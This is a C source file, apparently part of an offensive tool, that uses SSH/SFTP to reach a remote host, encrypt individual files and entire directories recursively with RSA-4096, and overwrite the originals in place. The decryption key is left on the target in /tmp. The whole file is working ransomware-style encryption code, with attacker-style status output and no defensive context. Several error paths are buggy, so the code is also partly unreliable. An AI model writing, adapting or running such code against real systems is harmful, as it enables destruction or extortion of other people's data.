#include "rsa_crypto.h"
#include "ssh_utils.h"
#include "utils.h"  // для global_rsa_keys, если используется (но лучше избегать — см. примечание)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <libssh/sftp.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/bio.h>
#include <openssl/evp.h>

// ==================== RSA Operations ====================
int initialize_rsa_keys(rsa_keys_t *keys) {
    if (keys->public_key && keys->private_key) {
        return 1;
    }
    if (keys->public_key_path[0] == '\0') {
        snprintf(keys->public_key_path, sizeof(keys->public_key_path), 
                "/tmp/global_rsa_pub_%d.pem", (int)getpid());
    }
    if (keys->private_key_path[0] == '\0') {
        snprintf(keys->private_key_path, sizeof(keys->private_key_path), 
                "/tmp/global_rsa_priv_%d.pem", (int)getpid());
    }
    printf("[*] Generating global RSA-%d key pair...\n", RSA_KEY_SIZE);
    if (!generate_rsa_key_pair(keys->public_key_path, keys->private_key_path)) {
        fprintf(stderr, "Failed to generate global RSA key pair\n");
        return 0;
    }
    keys->public_key = load_public_key(keys->public_key_path);
    keys->private_key = load_private_key(keys->private_key_path);
    if (!keys->public_key || !keys->private_key) {
        fprintf(stderr, "Failed to load global RSA keys\n");
        if (keys->public_key) RSA_free(keys->public_key);
        if (keys->private_key) RSA_free(keys->private_key);
        keys->public_key = NULL;
        keys->private_key = NULL;
        return 0;
    }
    printf("[+] Global RSA-%d key pair initialized\n", RSA_KEY_SIZE);
    return 1;
}

void cleanup_rsa_keys(rsa_keys_t *keys) {
    if (keys->public_key) {
        RSA_free(keys->public_key);
        keys->public_key = NULL;
    }
    if (keys->private_key) {
        RSA_free(keys->private_key);
        keys->private_key = NULL;
    }
    if (keys->public_key_path[0] != '\0') {
        unlink(keys->public_key_path);
        keys->public_key_path[0] = '\0';
    }
    if (keys->private_key_path[0] != '\0') {
        unlink(keys->private_key_path);
        keys->private_key_path[0] = '\0';
    }
}

int generate_rsa_key_pair(const char *public_key_file, const char *private_key_file) {
    RSA *rsa = NULL;
    BIGNUM *bn = NULL;
    FILE *pub_fp = NULL, *priv_fp = NULL;
    int ret = 0;

    // УДАЛЕНО: OpenSSL_add_all_algorithms();
    // УДАЛЕНО: ERR_load_crypto_strings();

    bn = BN_new();
    if (!bn || !BN_set_word(bn, RSA_F4)) {
        fprintf(stderr, "Error setting RSA exponent\n");
        goto cleanup;
    }

    printf("Generating %d-bit RSA key pair...\n", RSA_KEY_SIZE);
    rsa = RSA_new();
    if (!rsa || !RSA_generate_key_ex(rsa, RSA_KEY_SIZE, bn, NULL)) {
        fprintf(stderr, "Error generating RSA key pair\n");
        goto cleanup;
    }

    pub_fp = fopen(public_key_file, "w");
    if (!pub_fp) {
        fprintf(stderr, "Error opening public key file for writing\n");
        goto cleanup;
    }
    if (!PEM_write_RSAPublicKey(pub_fp, rsa)) {
        fprintf(stderr, "Error writing public key\n");
        goto cleanup;
    }

    priv_fp = fopen(private_key_file, "w");
    if (!priv_fp) {
        fprintf(stderr, "Error opening private key file for writing\n");
        goto cleanup;
    }
    if (!PEM_write_RSAPrivateKey(priv_fp, rsa, NULL, NULL, 0, NULL, NULL)) {
        fprintf(stderr, "Error writing private key\n");
        goto cleanup;
    }

    printf("RSA key pair generated successfully.\n");
    ret = 1;

cleanup:
    if (pub_fp) fclose(pub_fp);
    if (priv_fp) fclose(priv_fp);
    if (rsa) RSA_free(rsa);
    if (bn) BN_free(bn);
    // УДАЛЕНО: EVP_cleanup();
    // УДАЛЕНО: ERR_free_strings();
    return ret;
}

RSA *load_public_key(const char *public_key_file) {
    FILE *fp = fopen(public_key_file, "r");
    if (!fp) {
        fprintf(stderr, "Error opening public key file\n");
        return NULL;
    }
    RSA *rsa = PEM_read_RSAPublicKey(fp, NULL, NULL, NULL);
    fclose(fp);
    if (!rsa) {
        fprintf(stderr, "Error reading public key\n");
        ERR_print_errors_fp(stderr);
    }
    return rsa;
}

RSA *load_private_key(const char *private_key_file) {
    FILE *fp = fopen(private_key_file, "r");
    if (!fp) {
        fprintf(stderr, "Error opening private key file\n");
        return NULL;
    }
    RSA *rsa = PEM_read_RSAPrivateKey(fp, NULL, NULL, NULL);
    fclose(fp);
    if (!rsa) {
        fprintf(stderr, "Error reading private key\n");
        ERR_print_errors_fp(stderr);
    }
    return rsa;
}

int encrypt_file(const char *input_file, const char *output_file, RSA *rsa) {
    FILE *in_fp = NULL, *out_fp = NULL;
    unsigned char *buffer = NULL;
    unsigned char *encrypted = NULL;
    int buffer_len, encrypted_len;
    int ret = 0;
    int rsa_size = RSA_size(rsa);
    int max_data_len = rsa_size - 42;

    in_fp = fopen(input_file, "rb");
    if (!in_fp) {
        fprintf(stderr, "Error opening input file: %s\n", input_file);
        goto cleanup;
    }

    out_fp = fopen(output_file, "wb");
    if (!out_fp) {
        fprintf(stderr, "Error opening output file: %s\n", output_file);
        goto cleanup;
    }

    buffer = (unsigned char *)malloc(max_data_len);
    encrypted = (unsigned char *)malloc(rsa_size);
    if (!buffer || !encrypted) {
        fprintf(stderr, "Memory allocation error\n");
        goto cleanup;
    }

    while ((buffer_len = fread(buffer, 1, max_data_len, in_fp)) > 0) {
        encrypted_len = RSA_public_encrypt(buffer_len, buffer, encrypted, rsa, RSA_PKCS1_OAEP_PADDING);
        if (encrypted_len == -1) {
            fprintf(stderr, "Encryption error\n");
            ERR_print_errors_fp(stderr);
            goto cleanup;
        }
        if (fwrite(encrypted, 1, encrypted_len, out_fp) != encrypted_len) {
            fprintf(stderr, "Error writing to output file\n");
            goto cleanup;
        }
    }
    ret = 1;

cleanup:
    if (in_fp) fclose(in_fp);
    if (out_fp) fclose(out_fp);
    if (buffer) free(buffer);
    if (encrypted) free(encrypted);
    return ret;
}

int decrypt_file(const char *input_file, const char *output_file, RSA *rsa) {
    FILE *in_fp = NULL, *out_fp = NULL;
    unsigned char *buffer = NULL;
    unsigned char *decrypted = NULL;
    int buffer_len, decrypted_len;
    int ret = 0;
    int rsa_size = RSA_size(rsa);

    in_fp = fopen(input_file, "rb");
    if (!in_fp) {
        fprintf(stderr, "Error opening input file: %s\n", input_file);
        goto cleanup;
    }

    out_fp = fopen(output_file, "wb");
    if (!out_fp) {
        fprintf(stderr, "Error opening output file: %s\n", output_file);
        goto cleanup;
    }

    buffer = (unsigned char *)malloc(rsa_size);
    decrypted = (unsigned char *)malloc(rsa_size);
    if (!buffer || !decrypted) {
        fprintf(stderr, "Memory allocation error\n");
        goto cleanup;
    }

    while ((buffer_len = fread(buffer, 1, rsa_size, in_fp)) > 0) {
        if (buffer_len != rsa_size) {
            fprintf(stderr, "Invalid encrypted data size\n");
            goto cleanup;
        }
        decrypted_len = RSA_private_decrypt(buffer_len, buffer, decrypted, rsa, RSA_PKCS1_OAEP_PADDING);
        if (decrypted_len == -1) {
            fprintf(stderr, "Decryption error\n");
            ERR_print_errors_fp(stderr);
            goto cleanup;
        }
        if (fwrite(decrypted, 1, decrypted_len, out_fp) != decrypted_len) {
            fprintf(stderr, "Error writing to output file\n");
            goto cleanup;
        }
    }
    ret = 1;

cleanup:
    if (in_fp) fclose(in_fp);
    if (out_fp) fclose(out_fp);
    if (buffer) free(buffer);
    if (decrypted) free(decrypted);
    return ret;
}

// ==================== Remote Encryption Functions ====================
// Предполагается, что global_rsa_keys определена в main.c и объявлена как extern в utils.h
extern rsa_keys_t global_rsa_keys;

void encrypt_remote_file(ssh_session session, const char *remote_file) {
    printf("[+] Encrypting remote file with RSA-4096: %s\n", remote_file);
    if (!initialize_rsa_keys(&global_rsa_keys)) {
        fprintf(stderr, "Failed to initialize RSA keys\n");
        return;
    }
    char temp_file[1024];
    snprintf(temp_file, sizeof(temp_file), "%s.tmp", remote_file);
    char encrypted_file[1024];
    snprintf(encrypted_file, sizeof(encrypted_file), "%s.encrypted", remote_file);

    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(session));
        return;
    }
    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }

    sftp_file remote_src = sftp_open(sftp, remote_file, O_RDONLY, 0);
    if (!remote_src) {
        fprintf(stderr, "Cannot open remote file for reading: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }

    FILE *local_temp = fopen(temp_file, "wb");
    if (!local_temp) {
        fprintf(stderr, "Cannot open local temporary file: %s\n", strerror(errno));
        sftp_close(remote_src);
        sftp_free(sftp);
        return;
    }

    char buffer[BUFFER_SIZE];
    ssize_t nbytes;
    while ((nbytes = sftp_read(remote_src, buffer, sizeof(buffer))) > 0) {
        if (fwrite(buffer, 1, nbytes, local_temp) != nbytes) {
            fprintf(stderr, "Error writing to local temporary file\n");
            fclose(local_temp);
            sftp_close(remote_src);
            sftp_free(sftp);
            unlink(temp_file);
            return;
        }
    }
    fclose(local_temp);
    sftp_close(remote_src);

    if (!encrypt_file(temp_file, encrypted_file, global_rsa_keys.public_key)) {
        fprintf(stderr, "Error encrypting file\n");
        sftp_free(sftp);
        unlink(temp_file);
        unlink(encrypted_file);
        return;
    }

    FILE *encrypted_src = fopen(encrypted_file, "rb");
    if (!encrypted_src) {
        fprintf(stderr, "Cannot open encrypted file: %s\n", strerror(errno));
        sftp_free(sftp);
        unlink(temp_file);
        unlink(encrypted_file);
        return;
    }

    sftp_file remote_dst = sftp_open(sftp, remote_file, O_WRONLY | O_TRUNC, 0644);
    if (!remote_dst) {
        fprintf(stderr, "Cannot open remote file for writing: %s\n", ssh_get_error(session));
        fclose(encrypted_src);
        sftp_free(sftp);
        unlink(temp_file);
        unlink(encrypted_file);
        return;
    }

    while ((nbytes = fread(buffer, 1, sizeof(buffer), encrypted_src)) > 0) {
        if (sftp_write(remote_dst, buffer, nbytes) != nbytes) {
            fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(session));
            fclose(encrypted_src);
            sftp_close(remote_dst);
            sftp_free(sftp);
            unlink(temp_file);
            unlink(encrypted_file);
            return;
        }
    }
    fclose(encrypted_src);
    sftp_close(remote_dst);

    const char *remote_key_path = "/tmp/.rsa_key.pem";
    FILE *key_file = fopen(global_rsa_keys.private_key_path, "rb");
    if (key_file) {
        fseek(key_file, 0, SEEK_END);
        long key_size = ftell(key_file);
        fseek(key_file, 0, SEEK_SET);
        char *key_data = malloc(key_size);
        if (key_data) {
            if (fread(key_data, 1, key_size, key_file) == key_size) {
                sftp_file remote_key = sftp_open(sftp, remote_key_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
                if (remote_key) {
                    sftp_write(remote_key, key_data, key_size);
                    sftp_close(remote_key);
                }
            }
            free(key_data);
        }
        fclose(key_file);
    }

    sftp_free(sftp);
    unlink(temp_file);
    unlink(encrypted_file);
    printf("[+] File encrypted successfully with RSA-4096: %s\n", remote_file);
    printf("[+] Decryption key saved to: %s\n", remote_key_path);
}

void decrypt_remote_file(ssh_session session, const char *remote_file) {
    printf("[+] Decrypting remote file with RSA-4096: %s\n", remote_file);
    const char *remote_key_path = "/tmp/.rsa_key.pem";
    const char *local_key_path = "/tmp/remote_rsa_key.pem";

    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(session));
        return;
    }
    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }

    sftp_file remote_key = sftp_open(sftp, remote_key_path, O_RDONLY, 0);
    if (!remote_key) {
        fprintf(stderr, "Cannot open remote key file: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }

    FILE *local_key = fopen(local_key_path, "wb");
    if (!local_key) {
        fprintf(stderr, "Cannot open local key file: %s\n", strerror(errno));
        sftp_close(remote_key);
        sftp_free(sftp);
        return;
    }

    char buffer[BUFFER_SIZE];
    ssize_t nbytes;
    while ((nbytes = sftp_read(remote_key, buffer, sizeof(buffer))) > 0) {
        if (fwrite(buffer, 1, nbytes, local_key) != nbytes) {
            fprintf(stderr, "Error writing to local key file\n");
            fclose(local_key);
            sftp_close(remote_key);
            sftp_free(sftp);
            unlink(local_key_path);
            return;
        }
    }
    fclose(local_key);
    sftp_close(remote_key);

    RSA *rsa = load_private_key(local_key_path);
    if (!rsa) {
        fprintf(stderr, "Failed to load RSA private key\n");
        sftp_free(sftp);
        unlink(local_key_path);
        return;
    }

    char temp_file[1024];
    snprintf(temp_file, sizeof(temp_file), "%s.tmp", remote_file);
    char decrypted_file[1024];
    snprintf(decrypted_file, sizeof(decrypted_file), "%s.decrypted", remote_file);

    sftp_file remote_src = sftp_open(sftp, remote_file, O_RDONLY, 0);
    if (!remote_src) {
        fprintf(stderr, "Cannot open remote file for reading: %s\n", ssh_get_error(session));
        RSA_free(rsa);
        sftp_free(sftp);
        unlink(local_key_path);
        return;
    }

    FILE *local_temp = fopen(temp_file, "wb");
    if (!local_temp) {
        fprintf(stderr, "Cannot open local temporary file: %s\n", strerror(errno));
        sftp_close(remote_src);
        RSA_free(rsa);
        sftp_free(sftp);
        unlink(local_key_path);
        return;
    }

    while ((nbytes = sftp_read(remote_src, buffer, sizeof(buffer))) > 0) {
        if (fwrite(buffer, 1, nbytes, local_temp) != nbytes) {
            fprintf(stderr, "Error writing to local temporary file\n");
            fclose(local_temp);
            sftp_close(remote_src);
            RSA_free(rsa);
            sftp_free(sftp);
            unlink(temp_file);
            unlink(local_key_path);
            return;
        }
    }
    fclose(local_temp);
    sftp_close(remote_src);

    if (!decrypt_file(temp_file, decrypted_file, rsa)) {
        fprintf(stderr, "Error decrypting file\n");
        RSA_free(rsa);
        sftp_free(sftp);
        unlink(temp_file);
        unlink(decrypted_file);
        unlink(local_key_path);
        return;
    }

    FILE *decrypted_src = fopen(decrypted_file, "rb");
    if (!decrypted_src) {
        fprintf(stderr, "Cannot open decrypted file: %s\n", strerror(errno));
        RSA_free(rsa);
        sftp_free(sftp);
        unlink(temp_file);
        unlink(decrypted_file);
        unlink(local_key_path);
        return;
    }

    sftp_file remote_dst = sftp_open(sftp, remote_file, O_WRONLY | O_TRUNC, 0644);
    if (!remote_dst) {
        fprintf(stderr, "Cannot open remote file for writing: %s\n", ssh_get_error(session));
        fclose(decrypted_src);
        RSA_free(rsa);
        sftp_free(sftp);
        unlink(temp_file);
        unlink(decrypted_file);
        unlink(local_key_path);
        return;
    }

    while ((nbytes = fread(buffer, 1, sizeof(buffer), decrypted_src)) > 0) {
        if (sftp_write(remote_dst, buffer, nbytes) != nbytes) {
            fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(session));
            fclose(decrypted_src);
            sftp_close(remote_dst);
            RSA_free(rsa);
            sftp_free(sftp);
            unlink(temp_file);
            unlink(decrypted_file);
            unlink(local_key_path);
            return;
        }
    }
    fclose(decrypted_src);
    sftp_close(remote_dst);
    RSA_free(rsa);
    sftp_free(sftp);
    unlink(temp_file);
    unlink(decrypted_file);
    unlink(local_key_path);
    printf("[+] File decrypted successfully with RSA-4096: %s\n", remote_file);
}

void encrypt_remote_directory(ssh_session session, const char *remote_dir) {
    printf("[+] Encrypting files in remote directory with RSA-4096: %s\n", remote_dir);
    if (!initialize_rsa_keys(&global_rsa_keys)) {
        fprintf(stderr, "Failed to initialize RSA keys\n");
        return;
    }

    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(session));
        return;
    }
    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }

    sftp_dir dir = sftp_opendir(sftp, remote_dir);
    if (!dir) {
        fprintf(stderr, "Cannot open remote directory: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }

    sftp_attributes attr;
    while ((attr = sftp_readdir(sftp, dir)) != NULL) {
        if (strcmp(attr->name, ".") == 0 || strcmp(attr->name, "..") == 0) {
            sftp_attributes_free(attr);
            continue;
        }
        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s/%s", remote_dir, attr->name);
        if (attr->type == SSH_FILEXFER_TYPE_DIRECTORY) {
            sftp_attributes_free(attr);
            encrypt_remote_directory(session, full_path);
            continue;
        }
        if (attr->type == SSH_FILEXFER_TYPE_REGULAR) {
            printf("[+] Encrypting file with RSA-4096: %s\n", full_path);
            char temp_file[1024];
            snprintf(temp_file, sizeof(temp_file), "/tmp/%s.tmp", attr->name);
            char encrypted_file[1024];
            snprintf(encrypted_file, sizeof(encrypted_file), "/tmp/%s.encrypted", attr->name);

            sftp_file remote_src = sftp_open(sftp, full_path, O_RDONLY, 0);
            if (!remote_src) {
                fprintf(stderr, "Cannot open remote file for reading: %s\n", ssh_get_error(session));
                sftp_attributes_free(attr);
                continue;
            }

            FILE *local_temp = fopen(temp_file, "wb");
            if (!local_temp) {
                fprintf(stderr, "Cannot open local temporary file: %s\n", strerror(errno));
                sftp_close(remote_src);
                sftp_attributes_free(attr);
                continue;
            }

            char buffer[BUFFER_SIZE];
            ssize_t nbytes;
            while ((nbytes = sftp_read(remote_src, buffer, sizeof(buffer))) > 0) {
                if (fwrite(buffer, 1, nbytes, local_temp) != nbytes) {
                    fprintf(stderr, "Error writing to local temporary file\n");
                    fclose(local_temp);
                    sftp_close(remote_src);
                    sftp_attributes_free(attr);
                    unlink(temp_file);
                    continue;
                }
            }
            fclose(local_temp);
            sftp_close(remote_src);

            if (!encrypt_file(temp_file, encrypted_file, global_rsa_keys.public_key)) {
                fprintf(stderr, "Error encrypting file\n");
                sftp_attributes_free(attr);
                unlink(temp_file);
                continue;
            }

            FILE *encrypted_src = fopen(encrypted_file, "rb");
            if (!encrypted_src) {
                fprintf(stderr, "Cannot open encrypted file: %s\n", strerror(errno));
                sftp_attributes_free(attr);
                unlink(temp_file);
                unlink(encrypted_file);
                continue;
            }

            sftp_file remote_dst = sftp_open(sftp, full_path, O_WRONLY | O_TRUNC, 0644);
            if (!remote_dst) {
                fprintf(stderr, "Cannot open remote file for writing: %s\n", ssh_get_error(session));
                fclose(encrypted_src);
                sftp_attributes_free(attr);
                unlink(temp_file);
                unlink(encrypted_file);
                continue;
            }

            while ((nbytes = fread(buffer, 1, sizeof(buffer), encrypted_src)) > 0) {
                if (sftp_write(remote_dst, buffer, nbytes) != nbytes) {
                    fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(session));
                    fclose(encrypted_src);
                    sftp_close(remote_dst);
                    sftp_attributes_free(attr);
                    unlink(temp_file);
                    unlink(encrypted_file);
                    continue;
                }
            }
            fclose(encrypted_src);
            sftp_close(remote_dst);
            unlink(temp_file);
            unlink(encrypted_file);
        }
        sftp_attributes_free(attr);
    }
    sftp_closedir(dir);
    const char *remote_key_path = "/tmp/.rsa_dir_key.pem";
    upload_file(session, global_rsa_keys.private_key_path, remote_key_path);
    sftp_free(sftp);
    printf("[+] Directory encryption completed with RSA-4096: %s\n", remote_dir);
    printf("[+] Decryption key saved to: %s\n", remote_key_path);
}

void decrypt_remote_directory(ssh_session session, const char *remote_dir) {
    printf("[+] Decrypting files in remote directory with RSA-4096: %s\n", remote_dir);
    const char *remote_key_path = "/tmp/.rsa_dir_key.pem";
    const char *local_key_path = "/tmp/remote_rsa_dir_key.pem";

    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "Error allocating SFTP session: %s\n", ssh_get_error(session));
        return;
    }
    if (sftp_init(sftp) != SSH_OK) {
        fprintf(stderr, "Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }

    sftp_file remote_key = sftp_open(sftp, remote_key_path, O_RDONLY, 0);
    if (!remote_key) {
        fprintf(stderr, "Cannot open remote key file: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        return;
    }

    FILE *local_key = fopen(local_key_path, "wb");
    if (!local_key) {
        fprintf(stderr, "Cannot open local key file: %s\n", strerror(errno));
        sftp_close(remote_key);
        sftp_free(sftp);
        return;
    }

    char buffer[BUFFER_SIZE];
    ssize_t nbytes;
    while ((nbytes = sftp_read(remote_key, buffer, sizeof(buffer))) > 0) {
        if (fwrite(buffer, 1, nbytes, local_key) != nbytes) {
            fprintf(stderr, "Error writing to local key file\n");
            fclose(local_key);
            sftp_close(remote_key);
            sftp_free(sftp);
            unlink(local_key_path);
            return;
        }
    }
    fclose(local_key);
    sftp_close(remote_key);

    RSA *rsa = load_private_key(local_key_path);
    if (!rsa) {
        fprintf(stderr, "Failed to load RSA private key\n");
        sftp_free(sftp);
        unlink(local_key_path);
        return;
    }

    sftp_dir dir = sftp_opendir(sftp, remote_dir);
    if (!dir) {
        fprintf(stderr, "Cannot open remote directory: %s\n", ssh_get_error(session));
        RSA_free(rsa);
        sftp_free(sftp);
        unlink(local_key_path);
        return;
    }

    sftp_attributes attr;
    while ((attr = sftp_readdir(sftp, dir)) != NULL) {
        if (strcmp(attr->name, ".") == 0 || strcmp(attr->name, "..") == 0) {
            sftp_attributes_free(attr);
            continue;
        }
        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s/%s", remote_dir, attr->name);
        if (attr->type == SSH_FILEXFER_TYPE_DIRECTORY) {
            sftp_attributes_free(attr);
            decrypt_remote_directory(session, full_path);
            continue;
        }
        if (attr->type == SSH_FILEXFER_TYPE_REGULAR) {
            printf("[+] Decrypting file with RSA-4096: %s\n", full_path);
            char temp_file[1024];
            snprintf(temp_file, sizeof(temp_file), "/tmp/%s.tmp", attr->name);
            char decrypted_file[1024];
            snprintf(decrypted_file, sizeof(decrypted_file), "/tmp/%s.decrypted", attr->name);

            sftp_file remote_src = sftp_open(sftp, full_path, O_RDONLY, 0);
            if (!remote_src) {
                fprintf(stderr, "Cannot open remote file for reading: %s\n", ssh_get_error(session));
                sftp_attributes_free(attr);
                continue;
            }

            FILE *local_temp = fopen(temp_file, "wb");
            if (!local_temp) {
                fprintf(stderr, "Cannot open local temporary file: %s\n", strerror(errno));
                sftp_close(remote_src);
                sftp_attributes_free(attr);
                continue;
            }

            while ((nbytes = sftp_read(remote_src, buffer, sizeof(buffer))) > 0) {
                if (fwrite(buffer, 1, nbytes, local_temp) != nbytes) {
                    fprintf(stderr, "Error writing to local temporary file\n");
                    fclose(local_temp);
                    sftp_close(remote_src);
                    sftp_attributes_free(attr);
                    unlink(temp_file);
                    continue;
                }
            }
            fclose(local_temp);
            sftp_close(remote_src);

            if (!decrypt_file(temp_file, decrypted_file, rsa)) {
                fprintf(stderr, "Error decrypting file\n");
                sftp_attributes_free(attr);
                unlink(temp_file);
                continue;
            }

            FILE *decrypted_src = fopen(decrypted_file, "rb");
            if (!decrypted_src) {
                fprintf(stderr, "Cannot open decrypted file: %s\n", strerror(errno));
                sftp_attributes_free(attr);
                unlink(temp_file);
                unlink(decrypted_file);
                continue;
            }

            sftp_file remote_dst = sftp_open(sftp, full_path, O_WRONLY | O_TRUNC, 0644);
            if (!remote_dst) {
                fprintf(stderr, "Cannot open remote file for writing: %s\n", ssh_get_error(session));
                fclose(decrypted_src);
                sftp_attributes_free(attr);
                unlink(temp_file);
                unlink(decrypted_file);
                continue;
            }

            while ((nbytes = fread(buffer, 1, sizeof(buffer), decrypted_src)) > 0) {
                if (sftp_write(remote_dst, buffer, nbytes) != nbytes) {
                    fprintf(stderr, "Error writing to remote file: %s\n", ssh_get_error(session));
                    fclose(decrypted_src);
                    sftp_close(remote_dst);
                    sftp_attributes_free(attr);
                    unlink(temp_file);
                    unlink(decrypted_file);
                    continue;
                }
            }
            fclose(decrypted_src);
            sftp_close(remote_dst);
            unlink(temp_file);
            unlink(decrypted_file);
        }
        sftp_attributes_free(attr);
    }
    sftp_closedir(dir);
    RSA_free(rsa);
    sftp_free(sftp);
    unlink(local_key_path);
    printf("[+] Directory decryption completed with RSA-4096: %s\n", remote_dir);
}
